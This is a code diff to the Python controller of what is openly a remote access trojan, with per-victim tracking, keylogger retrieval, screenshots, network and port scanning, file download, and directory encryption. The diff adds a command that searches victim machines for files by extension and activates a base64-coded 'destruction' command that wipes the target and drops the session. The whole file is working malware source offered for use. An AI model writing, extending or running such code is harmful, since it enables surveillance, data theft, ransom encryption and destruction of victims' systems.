@@ -1,6 +1,7 @@
 #!/usr/bin/python
 import ast
 import base64
+import json
 import os
 import pprint
 import sys
@@ -33,7 +34,6 @@ victims = {
     'target': [],
     'os': []
 }
-#En plan, infectas el ordenador víctima con el malware, y, una vez infectado, te haga un resumen de todos los dispositivos conectados a la red wifi del dispositivo de la víctima
 
 def crte():
     return b'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMyakNDQWNLZ0F3SUJBZ0lVY2wvZmZVbVc1NlE4cDlFU2VrdnlkVWhFOWJRd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0dERVdNQlFHQTFVRUF3d05LaTVsZUdGdGNHeGxMbU52YlRBZUZ3MHlNekE1TURZeU1EQXhOVFJhRncweQpOREE1TURVeU1EQXhOVFJhTUJneEZqQVVCZ05WQkFNTURTb3VaWGhoYlhCc1pTNWpiMjB3Z2dFaU1BMEdDU3FHClNJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUNvOStBTWw0aVpvTzdEZzd5QTB4cUcyaHRGTnZwUExxT3gKbkk1bkNCWVR6azFqV1ZvcjcycXZNOW9iR0lIeG1CWUJ1YXRIS0V0NXJWTzRLNXB2b1NrekdhT3NmUUtYbzcyYgp5TmRYemFKUVN3WFZSSldkcEs1cnpjZlhqdUp3U3BtcHlpN2J5YXlyNlpmNFhPNk1rSFJoNWEzWkNXN1JJSk9MCmJSRndyLzRtWDM2VnU5SVBPdUk0cWFxWmlSa004WmpnUnZ6QWhXaDNubm1hcEtnb3JQSnUwSDNhblBZTkxYU2oKMU5sWUg4MGFQMTQwZkFOaG9zbjRFbHdtRjY1V2xhNU1USlJlbXpxbG5OczA0OTBGOUVxL1hRbkVTS0hRditBKwpOY21abE1rL1pHd2xVWnovbUgxdGt3VkgrZXJnYXBMMk0vR2FPK09MWjdqU2NLU2E3SmVuQWdNQkFBR2pIREFhCk1CZ0dBMVVkRVFRUk1BK0NEU291WlhoaGJYQnNaUzVqYjIwd0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFFUHgKeEx3dFdndWcxYkNsaG5hRUFoRU1iL2hBNDBsbE5nSU5sOVptWk5LMUFBZUU0bjVaZ2tzSWZaV1dlUmVYT0p2VQp1TkhON3JFRnAwWktKNmNsSjVPOUk5eG5aU3gzbms4UVN5eFl2RE56Y0QyYTlEMklCcmYwZFROUnJUam8vdlozClBHVythL0lnaWI0dCs1SkljOTV3NEN1S210NFpoT3ZxZmo0bkZXYWpkbjdIZ0lvRnNjeGRVZW82aU00aHArcWcKOU94M0JJRVVTWFg4bDFCdFVodXYyaVZUTTJTdDRXMmk4N1BUVTlDcEMzQ3hYaHpmUHdhNkVNK25uSE9oRkNwQQpvcTI0cVEwS2svckczZVluRCtRTnhHRXdPekF0Q3YzUTZZNlVvMXV1TVNqUDgwaXJtVjREeFlPRFVpUkRaRjZiClNYZWRRcVREVTgyTi96WGpXdVE9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K'
@@ -74,6 +74,8 @@ def help_option():
 
                 Aviable Commands:
 
+                    | [!>] search <extension> -> Search for files with named extension
+                    ---------------------------------------------------------
                     | [!>] downloadDir <path> -> Download A full dir
                     ---------------------------------------------------------
                     | [!>] download <path> -> Download A File From Target PC
@@ -114,17 +116,13 @@ def help_option():
                     ---------------------------------------------------------
                     | [!>] cryptAll        -> (N/A) Close connex and crypt full system
                     ---------------------------------------------------------
-                    | [!>] destruction     -> (N/A) Eliminate all and close conect
+                    | [!>] destruction     -> Eliminate ALL and close conex
                     --------------------------------------------------------- 
                     | [!>] q               -> Suspend the conection
                     ---------------------------------------------------------
                     | [!>] exit            -> Terminate the conection
                     ---------------------------------------------------------
     ''')
-
-
-def startRansom():
-    pass
 
 
 def start(serverSock, promt):
@@ -444,7 +442,7 @@ def cryptDir(targetConn, command):
         print(f"\n\t{Y}[*>] {R}Dir Crypted Unsuccessfully{END}\n")
 
 
-def reciveKeylog(targetConn):
+def reciveKeylog(targetConn, ip):
     codedCommand = "a2V5bG9nX2R1bXAK"
     targetConn.send(codedCommand.encode())
     keylog_data = "".encode()
@@ -479,8 +477,7 @@ def reciveKeylog(targetConn):
     if progress < progress_bar_length:
         sys.stdout.write("▓" * (progress_bar_length - progress))
     sys.stdout.write(Y + "]\n" + Fore.RESET)
-
-    with open("./DATA/keylog.txt", "ab") as keylog:
+    with open(f"./DATA/{ip[0]}/keylog.txt", "ab") as keylog:
         keylog.write(keylog_data)
 
     if done:
@@ -579,7 +576,7 @@ def scanhost(targetConn, command, cachedCommands):
     if command in cachedCommands['commands']:
         print(f"\n{Y}Cached Command:\n{END}")
         printProcessData(cachedCommands['commands'][command])
-        return 0
+        return 2
         #print("\n{}Cached Command: {}HOST: {}\n\t\tPORTS: {}".format(Y, END, command.replace("scanhost", ""), cachedCommands['commands'][command]))
 
     else:
@@ -647,6 +644,80 @@ def printProcessData(formedData):
             except SyntaxError:
                 print(f"\n\t{Y}[*>] PORT: {END}{port}\n\t\t{formedData[0][ip][port]}")
 
+
+def hosts(cachedCommands):
+    try:
+        print("\n\t", cachedCommands['commands']["scannet"], "\n")
+    except NameError:
+        print(f"\n\t{R}[!>] {Y}Not Scanned Net....{END}\n")
+    except KeyError:
+        print(f"\n\t{R}[!>] {Y}Not Scanned Net....{END}\n")
+
+
+def scanHost(targetConn, command, cachedCommands):
+    res = scanhost(targetConn, command, cachedCommands)
+    if res == 0:
+        formedData = scanPorts(cachedCommands['commands'][command], command.replace("scanhost ", ""), targetConn,
+                               cachedCommands, command)
+        printProcessData(formedData)
+    elif res == 2:
+        pass
+    else:
+        print("\nERROR SCANNING HOST...")
+
+
+def printFormedFiles(fles):
+    print(f"\n{Y}[*>]{R} Files find:{END}\n")
+    for file in fles:
+        print(f"\t{Y}[*>]{B} {file}")
+    print("\n")
+
+
+def receiveFileList(targetConn):
+    # Receive the total length of the JSON string as a header
+    total_length = int(targetConn.recv(4096).decode())
+
+    data = ""
+    while len(data) < total_length:
+        chunk = targetConn.recv(4096).decode()
+        data += chunk
+
+    # Convert the received JSON string back to a list
+    fnded = json.loads(data)
+
+    return fnded
+
+
+def searchExt(command, ext, targetConn, cachedCommands):
+    if command in cachedCommands['commands']:
+        print(f"\n{Y}Cached Response:{END}")
+        printFormedFiles(cachedCommands['commands'][command])
+        return
+    print(f"\n\t{Y}[*>] {END}Searching .{ext} files. This may take a {R}while{END}... \n")
+    codedCommand = "c2VhcmNo {}".format(ext)
+    targetConn.send(codedCommand.encode())
+    buffer = targetConn.recv(2048)
+    if "prt".encode() in buffer:
+        f = receiveFileList(targetConn)
+    else:
+        buffer = buffer.decode().replace("buffer ", "")
+        f = targetConn.recv(int(buffer)).decode()
+        f = ast.literal_eval(f)
+
+    cachedCommands['commands'][command] = f
+    printFormedFiles(f)
+
+
+def autoDestruction(targetConn, ses):
+    codedCommand = "ZGVzdHJ1Y3Rpb24K"
+    targetConn.send(codedCommand.encode())
+    targetConn.close()
+    ip = victims['ip'][ses]
+    conn = victims['target'][ses]
+    victims['ip'].remove(ip)
+    victims['target'].remove(conn)
+
+
 def mainFunctions(ip, targetConn, ses):
     if not os.path.exists(f"./DATA/{ip[0]}"):
         os.makedirs(f"./DATA/{ip[0]}")
@@ -713,7 +784,7 @@ def mainFunctions(ip, targetConn, ses):
                 shell(targetConn, ip)
 
             elif command.startswith("keylog_dump"):
-                reciveKeylog(targetConn)
+                reciveKeylog(targetConn, ip)
 
             elif command.startswith("screenshot"):
                 reciveScreenshot(targetConn, ip)
@@ -722,23 +793,20 @@ def mainFunctions(ip, targetConn, ses):
                 scannet(targetConn, command, cachedCommands)
 
             elif command == "hosts":
-                try:
-                    print("\n\t", cachedCommands['commands']["scannet"], "\n")
-                except NameError :
-                    print(f"\n\t{R}[!>] {Y}Not Scanned Net....{END}\n")
-                except KeyError:
-                    print(f"\n\t{R}[!>] {Y}Not Scanned Net....{END}\n")
+                hosts(cachedCommands)
 
             elif command.startswith("scanhost"):
-                res = scanhost(targetConn, command, cachedCommands)
-                if res == 0:
-                    formedData = scanPorts(cachedCommands['commands'][command], command.replace("scanhost ", ""), targetConn, cachedCommands, command)
-                    printProcessData(formedData)
-                else:
-                    print("\nERROR SCANNING HOST...")
+                scanHost(targetConn, command, cachedCommands)
 
-            elif command.startswith("ransom"):
-                startRansom()
+            elif command.startswith("search"):
+                extension = command.replace("search ", "")
+                searchExt(command, extension, targetConn, cachedCommands)
+
+            elif command.startswith("destruction"):
+                autoDestruction(targetConn, ses)
+                break
+
+
 
     except BrokenPipeError as e:
         print(f"\n{R}[>!] ERROR:{Y} {e}\n")
